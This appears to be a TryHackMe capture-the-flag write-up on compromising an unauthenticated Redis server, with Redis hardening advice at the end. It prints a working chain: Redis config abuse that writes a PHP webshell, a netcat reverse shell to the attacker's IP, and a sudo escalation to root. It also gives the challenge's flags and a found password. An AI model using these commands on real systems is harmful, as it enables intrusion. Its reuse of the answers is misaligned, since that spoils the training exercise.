---
title: "Res - Redis (TryHackMe)"
datePublished: Sun Jan 25 2026 18:13:07 GMT+0000 (Coordinated Universal Time)
cuid: cmku23zso000y02lebz617wxx
slug: res-redis-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1769364682148/b1c8e725-1aef-4b3c-a89b-bc37cd380024.png
tags: redis, penetration-testing, tryhackme, ctf-writeup, redis-cli

---

## Introduction

**Challenge Overview:** "Resy Set Go" is a TryHackMe challenge focused on exploiting a misconfigured Redis database server to gain unauthorized access and escalate privileges on a target system. This challenge demonstrates real-world security vulnerabilities that can occur when Redis is deployed without proper authentication.

**What is Redis?** Redis (Remote Dictionary Server) is an open-source, in-memory data structure store commonly used as a database, cache, and message broker. While powerful, Redis can become a critical security vulnerability when:

* Deployed without authentication (`requirepass` not set)
    
* Exposed to external networks
    
* Running with excessive file system permissions
    
* Not properly firewalled
    

**Learning Objectives:** In this challenge, you will learn:

* How to enumerate services using Nmap
    
* Techniques for exploiting unauthenticated Redis instances
    
* Writing PHP webshells through Redis configuration manipulation
    
* Establishing reverse shells for better system access
    
* Linux privilege escalation using sudo misconfigurations
    
* Systematic penetration testing methodology
    

**Attack Chain Overview:**

1. Reconnaissance and service enumeration
    
2. Redis exploitation for Remote Code Execution (RCE)
    
3. Initial foothold via webshell
    
4. Privilege escalation to root
    

## Resy Set Go

![](https://assets.tryhackme.com/additional/imgur/8GaJlJK.png align="left")

**Are you ready to take the challenge?  
**The machine may take up to 2 minutes to boot and configure

### Answer the questions below

1. Scan the machine, how many ports are open? `3`  
      
    `nmap -sV <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769360528969/aa361e41-3ba1-42b0-819b-08debfb73a14.png align="center")
    
    `nmap -p- -sV <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769360574808/b270653a-f4fa-4c5a-a77b-528af3e9f1c3.png align="center")
    
2. What's is the database management system installed on the server? `redis`
    
3. What port is the database management system running on? `6379`
    
4. What's is the version of management system installed on the server? `6.0.7`
    
5. Compromise the machine and locate user.txt `thm{red1s_rce_w1thout_credent1als}`  
      
    `redis-cli -h <IP_Address>`  
      
    `<IP_Address>` INFO
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769361061570/2bede7fd-e077-47d7-a00c-c786913de13d.png align="center")
    
    ```python
    redis-cli -h <IP_Address>
    <IP_Address> CONFIG SET dir /var/www/html
    OK
    <IP_Address> CONFIG SET dbfilename webshell.php
    OK
    <IP_Address> set test "<?php system($_GET['cmd']); ?>"
    OK
    <IP_Address> save
    OK
    <IP_Address> 
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769361334119/c91c2e13-5dbf-4338-a747-ca305b8c4968.png align="center")
    
    `http://<IP_Address>/webshell.php?cmd=whoami`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769361383756/840630fd-4abb-4413-984e-499bed836dd6.png align="center")
    
    `http://<IP_Address>/webshell.php?cmd=ls%20-la%20/home/vianka`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769361427262/dac722a4-6756-490f-b21e-f109f3f0e64f.png align="center")
    
      
    `http://<IP_Address>/webshell.php?cmd=cat%20/home/vianka/user.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769361450572/fb4c98a2-4cf3-4332-acde-5bd13fa9e23e.png align="center")
    
    **Alternative 2:**  
      
    Start by configuring and saving the `redis-cli` then start the `netcat` server and visit the browser and run:  
      
    `http://<TargetIP_Address>/webshell.php?cmd=nc%20<AttackIP_Address>%204444%20-e%20/bin/bash`
    
    ```bash
    redis-cli -h <IP_Address>
    <IP_Address> CONFIG SET dir /var/www/html
    OK
    <IP_Address> CONFIG SET dbfilename webshell.php
    OK
    <IP_Address> set test "<?php system($_GET['cmd']); ?>"
    OK
    <IP_Address> save
    OK
    <IP_Address> 
    ```
    
    ```bash
    nc -lvnp 4444
    Listening on 0.0.0.0 4444
    Connection received on 10.49.178.19 41696
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    pwd
    /var/www/html
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    www-data@<IP_Address>:/var/www/html$ ls
    ls
    index.html  webshell.php
    www-data@<IP_Address>:/var/www/html$ cd /home
    cd /home
    www-data@<IP_Address>:/home$ ls -la
    ls -la
    total 16
    drwxr-xr-x  4 root   root   4096 Jan 23 10:48 .
    drwxr-xr-x 22 root   root   4096 Jan 23 10:48 ..
    drwxr-xr-x  3 ubuntu ubuntu 4096 Jan 23 10:48 ubuntu
    drwxr-xr-x  5 vianka vianka 4096 Sep  2  2020 vianka
    www-data@<IP_Address>:/home$ find / -type f -name user.txt 2>/dev/null
    find / -type f -name user.txt 2>/dev/null
    /home/vianka/user.txt
    cat /home/vianka/user.txt
    cat /home/vianka/user.txt
    www-data@<IP_Address>:/home$ cat /home/vianka/user.txt
    thm{red1s_rce_w1thout_credent1als}
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769363559409/6add32d3-054b-4c24-936c-d189767e80b8.png align="center")
    
6. What is the local user account password? `beautiful1`
    
7. Escalate privileges and obtain root.txt `thm{xxd_pr1v_escalat1on}`  
      
    with user: `Vianka` and their password: `beautiful1` We can now log in with `ssh` then check: `sudo -l`
    

```bash
ssh vianka@<IP_Address>
The authenticity of host '10.48.181.249 (10.48.181.249)' can't be established.
ECDSA key fingerprint is SHA256:1WT0TSyxE9MjbviYoyPtpaA7Pep8FfNsrDiv8217W1A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.181.249' (ECDSA) to the list of known hosts.
vianka@10.48.181.249's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
Last login: Wed Sep  2 14:11:10 2020
vianka@ip-<IP_Address>:~$ sudo -l
[sudo] password for vianka: 
Matching Defaults entries for vianka on ip-10-48-181-249:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ip-10-48-181-249:
    (ALL : ALL) ALL
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769364018632/2a71645b-475b-48e2-8923-904b5f472527.png align="center")

```bash
vianka@ip-10-48-181-249:~$ sudo su
root@ip-10-48-181-249:/home/vianka# find / -type f -name root.txt 2>/dev/null
/root/root.txt
cat /root/root.txt
root@ip-<IP_Address>:/home/vianka# cat /root/root.txt
thm{xxd_pr1v_escalat1on}
root@ip-<IP_Address>:/home/vianka# 
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769364057886/be8f669f-08ab-43b7-a5e4-b4796588dca3.png align="center")

## Conclusion

### What We Accomplished

In this challenge, we successfully compromised a system running an **unauthenticated Redis instance** and escalated our privileges from a low-privileged web user to complete root access. The attack chain demonstrated how a single misconfiguration can lead to total system compromise:

```bash
Reconnaissance → Redis Discovery → Configuration Abuse → Webshell Upload → 
Reverse Shell → Credential Discovery → Privilege Escalation → Root Access
```

### Key Security Lessons

**Why This Challenge Matters:**

1. **Defense in Depth Failed**: Multiple security controls were absent or misconfigured:
    
    * No Redis authentication (`requirepass` not set)
        
    * Redis exposed to external networks
        
    * Web server writable by Redis user
        
    * Overly permissive sudo configuration (`(ALL : ALL) ALL`)
        
2. **Real-World Relevance**: This isn't just a CTF scenario. Thousands of Redis instances are exposed on the internet right now without authentication. Platforms like Shodan regularly index vulnerable Redis servers that are actively being exploited for cryptocurrency mining, data theft, and botnet recruitment.
    
3. **The Domino Effect**: One weakness (unauthenticated Redis) cascaded into complete system compromise. This demonstrates why **every service matters** in production environments.
    

### Technical Skills Gained

✅ **Service Enumeration**: Using Nmap to discover and identify running services  
✅ **Redis Exploitation**: Manipulating Redis configuration for Remote Code Execution  
✅ **Webshell Development**: Writing PHP payloads and deploying them via Redis  
✅ **Shell Stabilization**: Converting basic shells into fully interactive TTY sessions  
✅ **Linux Privilege Escalation**: Identifying and exploiting sudo misconfigurations  
✅ **Systematic Methodology**: Following a structured penetration testing approach

### Redis Security Best Practices (For Defenders)

If you're deploying Redis in production, **always**:

1. **Enable Authentication**: Set a strong `requirepass` in redis.conf
    
2. **Bind to** [**Localhost**](http://Localhost): Use `bind 127.0.0.1 ::1` unless external access is required
    
3. **Enable Protected Mode**: Keep `protected-mode yes` (default in Redis 3.2+)
    
4. **Disable Dangerous Commands**: Rename or disable CONFIG, SAVE, FLUSHALL, etc.
    
5. **Run as Non-Root**: Use a dedicated, unprivileged Redis user
    
6. **Implement Firewall Rules**: Restrict Redis port (6379) to trusted IPs only
    
7. **Regular Updates**: Keep Redis updated to patch known vulnerabilities
    

### For Bug Bounty Hunters

**Redis Hunting Checklist:**

* Always scan for port 6379 (and check service detection for Redis on non-standard ports)
    
* Test for authentication immediately: `redis-cli -h target INFO`
    
* If unauthenticated, this is typically a **Medium to High** severity finding
    
* Check `CONFIG GET dir` and `CONFIG GET dbfilename` for exploitation paths
    
* Look for Redis in cloud environments (AWS ElastiCache, Azure Cache for Redis)
    
* Document your findings clearly with reproduction steps
    

**Report Template:**

```bash
Title: Unauthenticated Redis Instance Allows Remote Code Execution
Severity: High
Impact: Attackers can write arbitrary files, execute commands, and potentially 
        gain full system access
Steps to Reproduce: [Your enumeration and exploitation steps]
Remediation: Enable authentication, bind to localhost, implement firewall rules
```

### Connection to Your Bug Bounty Journey

Remember the **Hunter x Hunter crew** from your guide? This challenge embodies their qualities:

* 🟢 **Gon's Determination**: We didn't give up when Redis databases were empty - we pivoted to configuration manipulation
    
* ⚡ **Killua's Strategy**: We thought like attackers - "If I can write config files, where can I write that helps me?"
    
* ⛓️ **Kurapika's Focus**: We followed a clear methodology from enumeration to root
    
* 🎯 **Leorio's Persistence**: Each step built on the previous - enumeration → exploitation → privilege escalation
    

This is **exactly** how bug bounty hunting works: systematic exploration, creative thinking, and not giving up when the first approach doesn't work.

### Next Steps in Your Journey

**To Continue Improving:**

1. **Practice More Redis Challenges**: Search for "Redis exploitation" on TryHackMe and HackTheBox
    
2. **Learn Other Database Attacks**: MongoDB (27017), Elasticsearch (9200), Memcached (11211)
    
3. **Master Privilege Escalation**: Study Linux PrivEsc thoroughly - it's crucial for CTFs and real pentesting
    
4. **Build Your Methodology**: Every challenge should follow: Enumerate → Exploit → Escalate → Document
    
5. **Read Real Bug Bounty Reports**: Check HackerOne Hacktivity for disclosed Redis vulnerabilities
    

**Recommended Resources:**

* **HackTricks Redis Section**: Comprehensive Redis exploitation techniques
    
* **GTFOBins**: Privilege escalation using misconfured binaries/sudo
    
* **PayloadsAllTheThings**: Database exploitation payloads and techniques
    
* **Your Bug Bounty Guide**: Keep referring to it as you progress! 📚
    

### Final Thoughts

You've just completed a challenge that mirrors **real-world vulnerabilities** found in production environments every day. The techniques you used - Redis exploitation, webshell deployment, reverse shell establishment, and privilege escalation - are the same techniques that earn bug bounty hunters **Medium to Critical** severity payouts.

**Flags Captured:**

* 🚩 user.txt: `thm{red1s_rce_w1thout_credent1als}`
    
* 🚩 root.txt: `thm{xxd_pr1v_escalat1on}`
    

But more importantly, you **captured knowledge** - and that's what will make you successful in bug bounty hunting.

Remember: Every CTF challenge you complete builds your intuition. Every misconfiguration you learn to exploit makes you better at recognizing them in the wild. Keep practicing, keep documenting, and keep that **Hunter mentality** - you're on your way to your first accepted bug bounty report! 🏆

*"The difference between a beginner and a pro isn't talent - it's reps. You just got another rep in."*